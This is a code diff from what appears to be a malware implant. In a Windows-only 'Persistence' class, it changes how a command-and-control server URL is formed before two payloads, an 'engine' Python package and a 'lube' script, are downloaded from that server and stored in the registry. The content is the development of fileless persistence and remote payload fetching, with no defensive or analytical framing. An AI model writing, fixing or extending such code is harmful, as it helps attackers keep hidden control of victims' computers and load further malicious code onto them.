@@ -2208,13 +2208,14 @@ class Persistence:
                 logger.error("Non-Windows platform detected")
                 return {{"status": "error", "message": "Only Windows supported"}}
             
+            c2_clean = c2_server.rstrip('/')
             logger.info("Downloading and storing engine (Python package)")
-            if not Persistence._download_to_registry(f"{{c2_server}}//a/p", "engine", c2_server):
+            if not Persistence._download_to_registry(f"{{c2_clean}}/a/p", "engine", c2_clean):
                 logger.error("Failed to store engine in registry")
                 return {{"status": "error", "message": "Failed to store engine in registry"}}
             
             logger.info("Downloading and storing lube (Python script)")
-            if not Persistence._download_to_registry(f"{{c2_server}}//a/d", "lube", c2_server):
+            if not Persistence._download_to_registry(f"{{c2_clean}}/a/d", "lube", c2_clean):
                 logger.error("Failed to store lube in registry")
                 return {{"status": "error", "message": "Failed to store lube in registry"}}
             
